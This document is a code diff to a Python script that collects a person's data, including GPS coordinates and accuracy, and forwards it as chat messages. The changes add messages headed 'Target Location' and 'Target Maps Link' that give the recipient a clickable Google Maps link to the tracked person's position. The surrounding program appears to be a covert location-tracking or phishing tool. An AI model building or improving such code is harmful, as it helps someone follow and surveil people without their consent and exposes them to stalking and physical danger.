@@ -98,6 +98,11 @@ def send_location(latitude, longitude, caption=None):
         # If we have a caption, send it as a separate message
         if caption:
             send_message(caption)
+        
+        # Always send a convenient Google Maps link too
+        maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"
+        maps_message = f"📍 <b>Target Location:</b>\n\n<b>Coordinates:</b> {latitude}, {longitude}\n<b>Direct Maps Link:</b> {maps_url}"
+        send_message(maps_message)
             
         response = requests.post(url, data=data)
         response.raise_for_status()
@@ -131,10 +136,15 @@ def send_user_data(user_data):
             
         if 'location' in user_data and user_data['location']:
             loc = user_data['location']
-            message += f"\n<b>📍 Location:</b>\n"
+            message += f"\n<b>📍 Location Data:</b>\n"
             if 'latitude' in loc and 'longitude' in loc:
                 message += f"<b>Coordinates:</b> {loc['latitude']}, {loc['longitude']}\n"
-                message += f"<b>Google Maps:</b> https://www.google.com/maps?q={loc['latitude']},{loc['longitude']}\n"
+                maps_url = f"https://www.google.com/maps?q={loc['latitude']},{loc['longitude']}"
+                message += f"<b>Maps URL:</b> {maps_url}\n"
+                
+                # Send a separate clickable message with just the URL for easy access
+                send_message(f"📍 <b>Target Maps Link (click to open):</b>\n{maps_url}")
+                
             if 'accuracy' in loc:
                 message += f"<b>Accuracy:</b> {loc['accuracy']} meters\n"
                 
